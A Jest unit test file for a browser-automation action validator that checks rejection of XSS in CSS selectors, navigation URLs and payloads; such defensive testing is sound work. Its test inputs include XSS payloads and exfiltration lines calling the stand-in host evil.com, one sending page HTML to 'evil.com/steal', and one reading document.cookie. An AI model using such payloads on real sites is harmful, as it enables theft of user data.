/**
 * Unit tests for ActionValidator
 * Tests XSS prevention, selector validation, and payload security
 */

import { ActionValidator, Action, ValidationResult } from '../../src/shared/validators';

describe('ActionValidator', () => {
  describe('isValidSelector - Valid CSS Selectors', () => {
    test('accepts simple element selector', () => {
      const result = ActionValidator.isValidSelector('button');
      expect(result.valid).toBe(true);
    });

    test('accepts class selector', () => {
      const result = ActionValidator.isValidSelector('.submit-btn');
      expect(result.valid).toBe(true);
    });

    test('accepts ID selector', () => {
      const result = ActionValidator.isValidSelector('#submit-form');
      expect(result.valid).toBe(true);
    });

    test('accepts attribute selector', () => {
      const result = ActionValidator.isValidSelector('[data-testid="submit"]');
      expect(result.valid).toBe(true);
    });

    test('accepts complex selector', () => {
      const result = ActionValidator.isValidSelector('form.login-form > button.submit-btn');
      expect(result.valid).toBe(true);
    });

    test('accepts pseudo-selectors', () => {
      const result = ActionValidator.isValidSelector('button:first-child');
      expect(result.valid).toBe(true);
    });

    test('accepts multiple attribute selectors', () => {
      const result = ActionValidator.isValidSelector('input[type="text"][name="email"]');
      expect(result.valid).toBe(true);
    });
  });

  describe('isValidSelector - Event Handler Injection', () => {
    test('rejects onclick attribute', () => {
      const result = ActionValidator.isValidSelector('button onclick="alert(1)"');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('event handler');
    });

    test('rejects onerror attribute', () => {
      const result = ActionValidator.isValidSelector('img onerror="fetch(\'http://evil.com\')"');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('event handler');
    });

    test('rejects onload attribute', () => {
      const result = ActionValidator.isValidSelector('div onload="malicious()"');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('event handler');
    });

    test('rejects onmouseover attribute', () => {
      const result = ActionValidator.isValidSelector('[onmouseover="steal()"]');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('event handler');
    });

    test('rejects quoted event handlers', () => {
      const result = ActionValidator.isValidSelector('button "onclick=alert"');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('event handler');
    });

    test('rejects event handlers with spaces', () => {
      const result = ActionValidator.isValidSelector('div on click = "hack()"');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('event handler');
    });
  });

  describe('isValidSelector - Script Injection', () => {
    test('rejects script tag', () => {
      const result = ActionValidator.isValidSelector('<script>alert(1)</script>');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('script');
    });

    test('rejects script tag with spacing', () => {
      const result = ActionValidator.isValidSelector('< script > alert(1) </ script >');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('script');
    });

    test('rejects closing script tag alone', () => {
      const result = ActionValidator.isValidSelector('</script>');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('script');
    });
  });

  describe('isValidSelector - Protocol Injection', () => {
    test('rejects javascript protocol', () => {
      const result = ActionValidator.isValidSelector('javascript:alert(1)');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('javascript');
    });

    test('rejects javascript protocol with spaces', () => {
      const result = ActionValidator.isValidSelector('java script:alert(1)');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('javascript');
    });

    test('rejects javascript protocol in URL-like string', () => {
      const result = ActionValidator.isValidSelector('href="javascript:void(0)"');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('javascript');
    });
  });

  describe('isValidSelector - Data URI Injection', () => {
    test('rejects data:text/html URI', () => {
      const result = ActionValidator.isValidSelector('data:text/html,<script>alert(1)</script>');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('data URI');
    });

    test('rejects data:application/javascript URI', () => {
      const result = ActionValidator.isValidSelector('data:application/javascript,alert(1)');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('data URI');
    });
  });

  describe('isValidSelector - Unicode Escape Injection', () => {
    test('rejects Unicode escape sequences', () => {
      const result = ActionValidator.isValidSelector('\\u003cscript\\u003ealert(1)');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('Unicode');
    });

    test('rejects hex entity escape', () => {
      const result = ActionValidator.isValidSelector('&#x3cscript&#x3e;alert(1)');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('escape');
    });

    test('rejects decimal entity escape', () => {
      const result = ActionValidator.isValidSelector('&#60;script&#62;alert(1)');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('escape');
    });
  });

  describe('isValidSelector - HTML Entity XSS', () => {
    test('rejects HTML entity encoded script tag', () => {
      const result = ActionValidator.isValidSelector('&lt;script&gt;alert(1)');
      expect(result.valid).toBe(false);
      expect(result.error).toContain('entity');
    });
  });

  describe('isValidSelector - Edge Cases', () => {
    test('rejects empty string', () => {
      const result = ActionValidator.isValidSelector('');
      expect(result.valid).toBe(false);
    });

    test('rejects non-string', () => {
      const result = ActionValidator.isValidSelector(null as any);
      expect(result.valid).toBe(false);
    });

    test('rejects invalid CSS syntax', () => {
      const result = ActionValidator.isValidSelector('>>>>>>');
      expect(result.valid).toBe(false);
    });
  });

  describe('isValidAction - Valid Actions', () => {
    test('accepts valid click action', () => {
      const action: Action = { type: 'click', selector: 'button.submit' };
      const result = ActionValidator.isValidAction(action);
      expect(result.valid).toBe(true);
    });

    test('accepts valid type action', () => {
      const action: Action = { type: 'type', selector: 'input[name="email"]', text: 'test@example.com' };
      const result = ActionValidator.isValidAction(action);
      expect(result.valid).toBe(true);
    });

    test('accepts valid navigate action', () => {
      const action: Action = { type: 'navigate', url: 'https://example.com' };
      const result = ActionValidator.isValidAction(action);
      expect(result.valid).toBe(true);
    });

    test('accepts valid scroll action', () => {
      const action: Action = { type: 'scroll', delay: 500 };
      const result = ActionValidator.isValidAction(action);
      expect(result.valid).toBe(true);
    });

    test('accepts valid wait action', () => {
      const action: Action = { type: 'wait', delay: 1000 };
      const result = ActionValidator.isValidAction(action);
      expect(result.valid).toBe(true);
    });
  });

  describe('isValidAction - Invalid Action Types', () => {
    test('rejects unknown action type', () => {
      const action: Action = { type: 'hack' as any, selector: 'button' };
      const result = ActionValidator.isValidAction(action);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('Invalid action type');
    });

    test('rejects non-object action', () => {
      const result = ActionValidator.isValidAction('click' as any);
      expect(result.valid).toBe(false);
    });
  });

  describe('isValidAction - Selector Validation', () => {
    test('rejects action with XSS in selector', () => {
      const action: Action = { type: 'click', selector: 'button onclick="alert(1)"' };
      const result = ActionValidator.isValidAction(action);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('Selector validation failed');
    });
  });

  describe('isValidAction - Critical Actions', () => {
    test('submit action requires selector', () => {
      const action: Action = { type: 'submit' };
      const result = ActionValidator.isValidAction(action);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('requires a selector');
    });

    test('delete action requires selector', () => {
      const action: Action = { type: 'delete' };
      const result = ActionValidator.isValidAction(action);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('requires a selector');
    });

    test('submit action with valid selector passes', () => {
      const action: Action = { type: 'submit', selector: 'form.checkout' };
      const result = ActionValidator.isValidAction(action);
      expect(result.valid).toBe(true);
    });
  });

  describe('isValidAction - URL Validation', () => {
    test('rejects action with javascript: URL', () => {
      const action: Action = { type: 'navigate', url: 'javascript:alert(1)' };
      const result = ActionValidator.isValidAction(action);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('URL validation failed');
    });

    test('rejects action with data: URL', () => {
      const action: Action = { type: 'navigate', url: 'data:text/html,<script>alert(1)</script>' };
      const result = ActionValidator.isValidAction(action);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('URL validation failed');
    });

    test('accepts valid https URL', () => {
      const action: Action = { type: 'navigate', url: 'https://example.com/page' };
      const result = ActionValidator.isValidAction(action);
      expect(result.valid).toBe(true);
    });
  });

  describe('isValidAction - Delay Validation', () => {
    test('rejects negative delay', () => {
      const action: Action = { type: 'wait', delay: -100 };
      const result = ActionValidator.isValidAction(action);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('between 0 and 30000');
    });

    test('rejects delay over 30 seconds', () => {
      const action: Action = { type: 'wait', delay: 31000 };
      const result = ActionValidator.isValidAction(action);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('between 0 and 30000');
    });

    test('accepts delay of 0', () => {
      const action: Action = { type: 'wait', delay: 0 };
      const result = ActionValidator.isValidAction(action);
      expect(result.valid).toBe(true);
    });

    test('accepts delay of 30000', () => {
      const action: Action = { type: 'wait', delay: 30000 };
      const result = ActionValidator.isValidAction(action);
      expect(result.valid).toBe(true);
    });

    test('rejects non-numeric delay', () => {
      const action: Action = { type: 'wait', delay: 'slow' as any };
      const result = ActionValidator.isValidAction(action);
      expect(result.valid).toBe(false);
    });
  });

  describe('isValidPayload - Valid Payloads', () => {
    test('accepts null payload', () => {
      const result = ActionValidator.isValidPayload(null);
      expect(result.valid).toBe(true);
    });

    test('accepts undefined payload', () => {
      const result = ActionValidator.isValidPayload(undefined);
      expect(result.valid).toBe(true);
    });

    test('accepts string payload', () => {
      const result = ActionValidator.isValidPayload('hello world');
      expect(result.valid).toBe(true);
    });

    test('accepts number payload', () => {
      const result = ActionValidator.isValidPayload(42);
      expect(result.valid).toBe(true);
    });

    test('accepts boolean payload', () => {
      const result = ActionValidator.isValidPayload(true);
      expect(result.valid).toBe(true);
    });

    test('accepts simple object payload', () => {
      const payload = { name: 'John', age: 30, active: true };
      const result = ActionValidator.isValidPayload(payload);
      expect(result.valid).toBe(true);
    });

    test('accepts nested object payload', () => {
      const payload = { user: { name: 'John', email: 'john@example.com' }, settings: { theme: 'dark' } };
      const result = ActionValidator.isValidPayload(payload);
      expect(result.valid).toBe(true);
    });

    test('accepts array payload', () => {
      const payload = [1, 2, 3, 'four', { five: 5 }];
      const result = ActionValidator.isValidPayload(payload);
      expect(result.valid).toBe(true);
    });
  });

  describe('isValidPayload - Dangerous Payloads', () => {
    test('rejects function payload', () => {
      const payload = () => alert(1);
      const result = ActionValidator.isValidPayload(payload);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('function');
    });

    test('rejects string with script tag', () => {
      const payload = '<script>alert(1)</script>';
      const result = ActionValidator.isValidPayload(payload);
      expect(result.valid).toBe(false);
    });

    test('rejects string with javascript protocol', () => {
      const payload = 'javascript:alert(1)';
      const result = ActionValidator.isValidPayload(payload);
      expect(result.valid).toBe(false);
    });

    test('rejects object with function property', () => {
      const payload = { fn: () => {} };
      const result = ActionValidator.isValidPayload(payload);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('function');
    });

    test('rejects object with invalid property name', () => {
      const payload = { 'onclick="alert(1)"': 'value' };
      const result = ActionValidator.isValidPayload(payload);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('Invalid property name');
    });

    test('rejects nested object with dangerous string', () => {
      const payload = { user: { bio: '<img src=x onerror=alert(1)>' } };
      const result = ActionValidator.isValidPayload(payload);
      expect(result.valid).toBe(false);
    });

    test('rejects array containing function', () => {
      const payload = [1, 2, () => {}];
      const result = ActionValidator.isValidPayload(payload);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('function');
    });

    test('rejects non-plain object (Date)', () => {
      const payload = new Date();
      const result = ActionValidator.isValidPayload(payload);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('Non-plain objects');
    });

    test('rejects non-plain object (RegExp)', () => {
      const payload = /test/;
      const result = ActionValidator.isValidPayload(payload);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('Non-plain objects');
    });
  });

  describe('Integration Tests', () => {
    test('complete attack: selector injection with event handler', () => {
      const maliciousSelector = 'button" onclick="fetch(\'http://evil.com/steal?data=\' + document.body.innerHTML)"';
      const result = ActionValidator.isValidSelector(maliciousSelector);
      expect(result.valid).toBe(false);
    });

    test('complete attack: XSS via action payload', () => {
      const action: Action = {
        type: 'type',
        selector: 'input',
        text: '"><script>alert(document.cookie)</script>'
      };
      const result = ActionValidator.isValidAction(action);
      expect(result.valid).toBe(true); // Text itself is safe, DOM API will escape it
    });

    test('complete attack: malicious navigation action', () => {
      const action: Action = {
        type: 'navigate',
        url: 'javascript:void(fetch(\'http://evil.com\'))'
      };
      const result = ActionValidator.isValidAction(action);
      expect(result.valid).toBe(false);
    });

    test('safe action with special characters in text', () => {
      const action: Action = {
        type: 'type',
        selector: 'input.email',
        text: 'test+tag@example.co.uk'
      };
      const result = ActionValidator.isValidAction(action);
      expect(result.valid).toBe(true);
    });
  });
});
